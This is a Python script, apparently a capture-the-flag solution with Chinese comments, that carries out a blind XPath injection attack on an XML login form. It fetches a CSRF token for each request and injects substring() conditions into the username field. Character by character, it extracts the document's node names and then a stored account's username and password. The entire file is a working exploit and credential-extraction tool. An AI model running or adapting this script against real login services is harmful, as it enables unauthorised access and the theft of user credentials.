import requests
import string
import re
import random
import json

url = 'http://domain/login.php'

dic = string.ascii_letters + string.digits

# 获取token和SESSID
def get_token():
	headers = {
		"Cookie":"PHPSESSID=" + str(random.randint(1,9999999999))
	}
	req = requests.get(url, headers=headers)
	token = re.findall('"token" value="(.*?)"', req.text)[0]
	return token, headers


def get_value(*params, position=1):
	text = ''
	# 获取各节点值
	if len(params) == 0:
		data = "<username>1' or substring(name(/*[position()=" + str(position) + "]),{},1)='{}' or '1'='1</username><password>1</password><token>{}</token>"
	elif len(params) == 1:
		data = "<username>1' or substring(name(/" + params[0] + "/*[position()= " + str(position) + "]),{},1)='{}' or '1'='1</username><password>1</password><token>{}</token>"
	elif len(params) == 2:
		data = "<username>1' or substring(name(/" + params[0] + "/" + params[1] + "/*[position()= " + str(position) + "]),{},1)='{}' or '1'='1</username><password>1</password><token>{}</token>"
	elif len(params) == 3:
		data = "<username>1' or substring(name(/" + params[0] + "/" + params[1] + "/" + params[2] + "/*[position()= " + str(position) + "]),{},1)='{}' or '1'='1</username><password>1</password><token>{}</token>"
	elif len(params) == 4:
		data = "<username>1' or substring(name(/" + params[0] + "/" + params[1] + "/" + params[2] + "/" + params[3] + "/*[position()=" + str(position) + "],{},1))='{}' or '1'='1</username><password>1</password><token>{}</token>"
	# 获取用户名和密码
	elif len(params) == 5:
		data = "<username>1' or substring(/root/accounts/user[2]/username/text(),{},1)='{}' or '1'='1</username><password>1</password><token>{}</token>"
		data = "<username>1' or substring(/root/accounts/user[2]/password/text(),{},1)='{}' or '1'='1</username><password>1</password><token>{}</token>"
	
	for i in range(1,40):
		for j in dic:
			token, headers = get_token()
			headers["Content-Type"] = "application/xml"
			payload = data.format(i, j, token)
			res = requests.post(url, headers=headers,data=payload).text
			if '非法操作' in res:
				text += j
				print(text)
				break
	return text

v1 = get_value()
print(v1)

v2 = get_value(v1)
print(v2)

v3 = get_value(v1, v2)
print(v3)

v4 = get_value(v1, v2, v3)
print(v4)

v4_1 = get_value(v1, v2, v3, position=2)
print(v4_1)
v4_2 = get_value(v1, v2, v3, position=3)
print(v4_2)

v5 = get_value(1,2,3,4,5)
print(v5)



